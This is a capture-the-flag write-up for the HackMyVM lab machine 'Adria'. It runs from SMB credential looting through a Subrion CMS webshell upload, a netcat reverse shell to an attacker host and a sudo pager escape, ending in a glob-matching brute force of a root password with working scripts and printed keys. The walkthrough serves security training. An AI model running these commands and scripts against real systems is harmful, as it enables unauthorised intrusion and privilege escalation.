# Adria

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.111:22
Open 10.0.2.111:80
Open 10.0.2.111:139
Open 10.0.2.111:445
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.111
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp  open  http        syn-ack Apache httpd 2.4.57 ((Debian))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
|_http-title: Did not follow redirect to http://adria.hmv/
139/tcp open  netbios-ssn syn-ack Samba smbd 4
445/tcp open  netbios-ssn syn-ack Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17996/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 4411/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36671/udp): CLEAN (Failed to receive data)
|   Check 4 (port 63200/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ADRIA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ADRIA<00>            Flags: <unique><active>
|   ADRIA<03>            Flags: <unique><active>
|   ADRIA<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 0s
| smb2-time: 
|   date: 2025-11-20T15:28:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
:::

## SMB

```bash
└─$ netexec smb 10.0.2.111 -u '' -p '' --shares
SMB         10.0.2.111      445    ADRIA            [*] Unix - Samba (name:ADRIA) (domain:ADRIA) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.111      445    ADRIA            [+] ADRIA\:
SMB         10.0.2.111      445    ADRIA            [*] Enumerated shares
SMB         10.0.2.111      445    ADRIA            Share           Permissions     Remark
SMB         10.0.2.111      445    ADRIA            -----           -----------     ------
SMB         10.0.2.111      445    ADRIA            print$                          Printer Drivers
SMB         10.0.2.111      445    ADRIA            DebianShare     READ
SMB         10.0.2.111      445    ADRIA            IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         10.0.2.111      445    ADRIA            nobody                          Home Directories

└─$ impacket-smbclient ''/'':''@10.0.2.111
# shares
print$
DebianShare
IPC$
nobody
# use DebianShare
# ls
drw-rw-rw-          0  Mon Dec  4 04:32:45 2023 .
drw-rw-rw-          0  Sat Jul 22 04:10:13 2023 ..
-rw-rw-rw-    2756857  Mon Nov  6 10:56:24 2023 configz.zip
# get configz.zip
# exit
```

```bash
└─$ unzip configz.zip
└─$ ls
 boot   isolinux   preseed
└─$ grep pass . -Rin 2>/dev/null
./preseed/master.preseed:4:d-i partman-crypto/passphrase password jojo1989
./preseed/master.preseed:5:d-i partman-crypto/passphrase-again password jojo1989
./preseed/master.preseed:45:d-i passwd/user-fullname string admin
./preseed/master.preseed:46:d-i passwd/username string admin
./preseed/master.preseed:47:d-i passwd/user-password password jojo1989
./preseed/master.preseed:48:d-i passwd/root-login boolean true
./preseed/master.preseed:49:d-i passwd/root-password password jojo1989
./preseed/master.preseed:50:d-i user-setup/allow-password-weak boolean true
./preseed/master.seed:11:d-i passwd/user-fullname string Adam Lewis
./preseed/master.seed:12:d-i passwd/username string alewis
./preseed/master.seed:13:# Normal user's password, either in clear text
./preseed/master.seed:14:#d-i passwd/user-password password insecure
./preseed/master.seed:15:#d-i passwd/user-password-again password insecure
./preseed/master.seed:17:d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268
./preseed/master.seed:19:d-i passwd/user-uid string 1010
./preseed/master.seed:20:# The installer will warn about weak passwords. If you are sure you know
./preseed/master.seed:22:#d-i user-setup/allow-password-weak boolean true
./boot/grub/x86_64-efi/moddep.lst:4:legacycfg: gcry_md5 crypto password normal
./boot/grub/x86_64-efi/moddep.lst:124:password: crypto normal
./boot/grub/x86_64-efi/moddep.lst:140:password_pbkdf2: gcry_sha512 pbkdf2 crypto normal
./boot/grub/x86_64-efi/moddep.lst:178:legacy_password_test: legacycfg functional_test
./boot/grub/x86_64-efi/command.lst:106:legacy_check_password: legacycfg
./boot/grub/x86_64-efi/command.lst:111:legacy_password: legacycfg
./boot/grub/x86_64-efi/command.lst:155:password: password
./boot/grub/x86_64-efi/command.lst:156:password_pbkdf2: password_pbkdf2
./isolinux/ks.cfg:14:#Root password
./isolinux/ks.cfg:17:user cscience --fullname "Coin Science" --iscrypted --password $1$cw7eQ/70$/8ZeZKBBBJPtIFdnibj/X/
```

The hashes are not crackable, however there's password in plaintext: `jojo1989`

## HTTP

Add DNS record and access website with vhost

![writeup.png](/assets/pentest/hackmyvm/adria/writeup.png)

Nmap showed the directory listing from `robots.txt`

`/panel` seems to be admin panel

![writeup-1.png](/assets/pentest/hackmyvm/adria/writeup-1.png)

::: tip Creds
`admin:jojo1989`
:::

### Arbitrary File Upload

- [Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE](https://www.rapid7.com/db/modules/exploit/multi/http/subrion_cms_file_upload_rce)
- [Subrion CMS 4.2.1 - Arbitrary File Upload](https://www.exploit-db.com/exploits/49876)

```bash
└─$ curl 'https://www.exploit-db.com/download/49876' -Lso 'Subrion CMS 4-2-1 RCE.py'
└─$ py 'Subrion CMS 4-2-1 RCE.py' -u 'http://adria.hmv/panel/' -l 'admin' -p 'jojo1989'
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://adria.hmv/panel/
[+] Success!
[+] Got CSRF token: ZfWNtUvjwYag17TsuXcyLr0PEkQruTkdsgwVtQH0
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: xrjniynnnjptkxw

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://adria.hmv/panel/uploads/xrjniynnnjptkxw.phar

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
$ sudo -l
Matching Defaults entries for www-data on adria:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on adria:
    (adriana) NOPASSWD: /usr/bin/scalar
```

```bash
$ scalar  -h
$ sudo -u adriana /usr/bin/scalar  -h
$ sudo -u adriana /usr/bin/scalar --help
$ sudo -u adriana scalar help
SCALAR(1)                         Git Manual                         SCALAR(1)

NAME
       scalar - A tool for managing large Git repositories
```

The help menu opens in man pages style, with webshell we can't handle pagers but with reverse shell we can. This will be required, because `less` can be used to run other programs.

```bash
$ busybox nc 10.0.2.15 4444 -e /bin/bash
---
└─$ penelope -p 4444
www-data@adria:/var/www/html/uploads$ sudo -u adriana scalar help
...
 Manual page scalar(1) line 1 (press h for help or q to quit)
# Press :
# Type "!/bin/bash"
adriana@adria:/var/www/html/uploads$ id
uid=1001(adriana) gid=1001(adriana) groups=1001(adriana),100(users)
```

## SSH  (adriana)

```bash
adriana@adria:~$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

└─$ nano id_rsa.adriana
└─$ chmod 600 id_rsa.adriana
└─$ ssh -i id_rsa.adriana adriana@10.0.2.111
╰─$ id
uid=1001(adriana) gid=1001(adriana) groups=1001(adriana),100(users)
```

### User.txt

```bash
╰─$ cat user.txt
fbd401c3bff5ec92d1ba6f74a2340f0f
```

## Privilege Escalation

```bash
╰─$ sudo -l
sudo: unable to resolve host adria: Name or service not known
Matching Defaults entries for adriana on adria:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User adriana may run the following commands on adria:
    (ALL : ALL) NOPASSWD: /opt/backup

╰─$ file /opt/backup
/opt/backup: Bourne-Again shell script, ASCII text executable

╰─$ cat /opt/backup
#!/bin/bash

PASSWORD=$(/usr/bin/cat /root/pass)

read -ep "Password: " USER_PASS

if [[ $PASSWORD == $USER_PASS ]] ; then
  /usr/bin/echo "Authorized access"
  /usr/bin/sleep 1
  /usr/bin/zip -r -e -P "$PASSWORD" /opt/backup.zip /var/www/html
else
  /usr/bin/echo "Access denied"
  exit 1
fi
```

Vulnerability: Unquoted variable leads to pattern matching bypass
```bash
if [[ $PASSWORD == $USER_PASS ]] ; then
```

**This is NOT a literal string comparison**, because:
- Variables are **unquoted**
- `[[ ... == ... ]]` performs **pattern matching**, not exact equality

Meaning: `==` inside `[[ ]]` uses globbing. So if the original password is: `hunter2`, then entering: `*` matches **any** string.

```bash
╰─$ sudo /opt/backup
sudo: unable to resolve host adria: Name or service not known
Password: *
Authorized access
  adding: var/www/html/ (stored 0%)
```

Fuzz the length
```bash
#!/usr/bin/env bash
for ((i=1; i<=50; i++)); do
    pattern=$(python3 -c "print('?' * $i)")
    echo "[*] Trying length $i: '$pattern'"
    if echo "$pattern" | timeout 0.5 sudo /opt/backup 2>/dev/null | grep -q "Authorized access"; then
        echo "[+] MATCH FOUND: Password length = $i"
        exit 0
    fi
done
```

```bash
╰─$ bash /tmp/t.sh
[*] Trying length 1: '?'
...
[*] Trying length 31: '???????????????????????????????'
[+] MATCH FOUND: Password length = 31
```

Bruteforce password
```bash
#!/usr/bin/env bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()-_=+[]{}:;,.<>/"

test_recursive() {
    local pattern="$1"
    local depth="${#1}"
    
    [[ $depth -ge 32 ]] && return 0
    
    for ((i=0; i<${#chars}; i++)); do
        char=${chars:$i:1}
        new_pattern="${pattern}${char}*"
        
        if echo "$new_pattern" | timeout 0.5 sudo /opt/backup 2>/dev/null | grep -q "Authorized access"; then
            printf "[+] MATCH: '%s'\n" "$new_pattern"
            test_recursive "${pattern}${char}" $((depth + 1))
        fi
    done
}

echo "[*] Starting pattern matching..."
test_recursive ""
```

```bash
╰─$ bash /tmp/t.sh
...
[+] MATCH: '8eNctPoCh4Potes5eVD7eMxUw6wRB*'
[+] MATCH: '8eNctPoCh4Potes5eVD7eMxUw6wRBm*'
[+] MATCH: '8eNctPoCh4Potes5eVD7eMxUw6wRBmO*'
```

::: tip Creds
`root:8eNctPoCh4Potes5eVD7eMxUw6wRBmO`
:::

```bash
╰─$ su
Password: 8eNctPoCh4Potes5eVD7eMxUw6wRBmO

╰─# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
╰─# cat /root/root.txt
3a61b172fd39402aa96b1653a18e38a1
```

## P.S.

Alternative CMS RCE abuse (universal)
- [https://github.com/intelliants/subrion/issues/909](https://github.com/intelliants/subrion/issues/909)

Alternative to password leak, use **[pspy](https://github.com/DominicBreuker/pspy)** to view the commands in plain text.

![writeup-2.png](/assets/pentest/hackmyvm/adria/writeup-2.png)